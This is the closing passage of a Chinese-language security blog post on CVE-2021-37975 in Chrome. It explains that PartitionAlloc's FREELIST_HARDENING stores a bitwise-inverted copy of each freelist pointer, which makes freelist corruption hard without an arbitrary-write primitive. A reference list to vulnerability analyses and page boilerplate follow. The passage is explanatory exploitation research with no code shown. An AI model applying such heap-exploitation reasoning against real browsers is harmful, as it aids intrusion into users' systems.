<p>试了以后就发现，这个版本的 PartitionAlloc 增加了 FREELIST_HARDENING 特性，空闲内存块中除了空闲链表项，还额外存储了 8 字节作为校验值，这 8 字节存储了链表项的按位取反，因为我们只有实现了写任意/特定内存的能力才能修改链表头后面的 8 字节值的，所以不太可能绕过这个校验了。</p>

<h2 id="参考">参考</h2>
<ul>
  <li>https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-37975.html</li>
  <li>https://securitylab.github.com/research/in_the_wild_chrome_cve_2021_37975/</li>
  <li>https://v8.dev/blog/trash-talk</li>
  <li>https://en.wikipedia.org/wiki/Cheney%27s_algorithm</li>
  <li>https://en.wikipedia.org/wiki/Tracing_garbage_collection</li>
  <li>https://securelist.com/the-zero-day-exploits-of-operation-wizardopium/97086/</li>
</ul>

  </div><div id="disqus_thread"></div>
  <script>
    var disqus_config = function () {
      this.page.url = '';
      this.page.identifier = 'https://pwntips.github.io/2022/05/18/CVE-2021-37975.html';
    };

    (function() {
      var d = document, s = d.createElement('script');

      s.src = 'https://PwnTips.disqus.com/embed.js';

      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  </script>
  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript><a class="u-url" href="/2022/05/18/CVE-2021-37975.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <div class="footer-col-wrapper">
      <div class="footer-col">
        <p class="feed-subscribe">
          <a href="https://pwntips.github.io/feed.xml">
            <svg class="svg-icon orange">
              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
            </svg><span>Subscribe</span>
          </a>
        </p>
      </div>
      <div class="footer-col">
        <p>Tips &amp; Tricks</p>
      </div>
    </div>

    <div class="social-links"><ul class="social-media-list"></ul>
</div>

  </div>

</footer>
</body>

</html>
